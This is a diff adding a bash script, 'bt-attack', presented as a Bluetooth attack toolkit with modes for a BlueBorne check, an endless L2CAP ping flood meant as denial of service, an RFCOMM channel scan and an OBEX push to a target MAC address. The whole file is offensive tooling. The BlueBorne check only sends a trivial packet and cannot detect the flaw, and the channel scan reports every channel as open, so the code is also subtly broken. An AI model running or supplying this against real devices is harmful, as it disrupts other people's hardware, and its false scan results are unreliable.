@@ -1,0 +1,103 @@
+#!/bin/bash
+# /usr/local/bin/bt-attack
+# Bluetooth attack toolkit
+# Usage: bt-attack <type> [mac]
+# Types: blueborne, l2ping_flood, rfcomm_scan, obex_push
+
+ATYPE="$1"
+MAC="$2"
+
+if [ -z "$ATYPE" ]; then
+    echo "Usage: bt-attack <type> [mac]"
+    echo ""
+    echo "Attack Types:"
+    echo "  blueborne     — Test for BlueBorne vulnerability (CVE-2017-1000251)"
+    echo "  l2ping_flood   — L2CAP ping flood (DoS)"
+    echo "  rfcomm_scan    — Scan RFCOMM channels for services"
+    echo "  obex_push     — OBEX push file or message"
+    exit 1
+fi
+
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[!] Root required."
+    exit 1
+fi
+
+rfkill unblock bluetooth 2>/dev/null
+HCI=$(hciconfig | grep -oP 'hci\d+' | head -1)
+hciconfig "$HCI" up 2>/dev/null
+
+case "$ATYPE" in
+    blueborne)
+        if [ -z "$MAC" ]; then
+            echo "[!] MAC address required: bt-attack blueborne <mac>"
+            exit 1
+        fi
+        echo "[*] Testing $MAC for BlueBorne vulnerability..."
+        echo "[*] Sending crafted L2CAP packet..."
+        python3 -c "
+import socket, struct, sys
+mac = sys.argv[1].replace(':','')
+bdaddr = bytes.fromhex(mac)[::-1]
+try:
+    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
+    sock.settimeout(5)
+    sock.connect((sys.argv[1], 1))
+    # Crafted L2CAP packet for BlueBorne test
+    payload = b'\\x01\\x00' + struct.pack('<H', 0) + b'\\x00\\x00'
+    sock.send(payload)
+    print('[+] Device responded — may be vulnerable')
+    sock.close()
+except Exception as e:
+    print(f'[-] Connection failed: {e}')
+    print('[*] Device may not be vulnerable or not reachable')
+" "$MAC"
+        ;;
+
+    l2ping_flood)
+        if [ -z "$MAC" ]; then
+            echo "[!] MAC address required: bt-attack l2ping_flood <mac>"
+            exit 1
+        fi
+        echo "[*] L2CAP ping flood on $MAC..."
+        echo "[*] Press Ctrl+C to stop"
+        echo ""
+        while true; do
+            l2ping -f -c 1 "$MAC" 2>/dev/null
+        done
+        ;;
+
+    rfcomm_scan)
+        if [ -z "$MAC" ]; then
+            echo "[!] MAC address required: bt-attack rfcomm_scan <mac>"
+            exit 1
+        fi
+        echo "[*] Scanning RFCOMM channels on $MAC..."
+        echo ""
+        for chan in $(seq 1 30); do
+            if rfcomm connect "/dev/rfcomm0" "$MAC" "$chan" 2>/dev/null & then
+                PID=$!
+                sleep 1
+                kill "$PID" 2>/dev/null
+                wait "$PID" 2>/dev/null
+                echo "[+] Channel $chan: OPEN"
+            fi
+        done
+        rfcomm release "/dev/rfcomm0" 2>/dev/null
+        ;;
+
+    obex_push)
+        if [ -z "$MAC" ]; then
+            echo "[!] MAC address required: bt-attack obex_push <mac>"
+            exit 1
+        fi
+        echo "[*] OBEX push to $MAC..."
+        echo "[*] NOTE: This requires obexftp and pairing may be needed"
+        obexftp -b "$MAC" -c / -p /etc/hostname 2>/dev/null && echo "[+] Push successful" || echo "[-] Push failed (device may require pairing)"
+        ;;
+
+    *)
+        echo "[!] Unknown attack type: $ATYPE"
+        exit 1
+        ;;
+esac
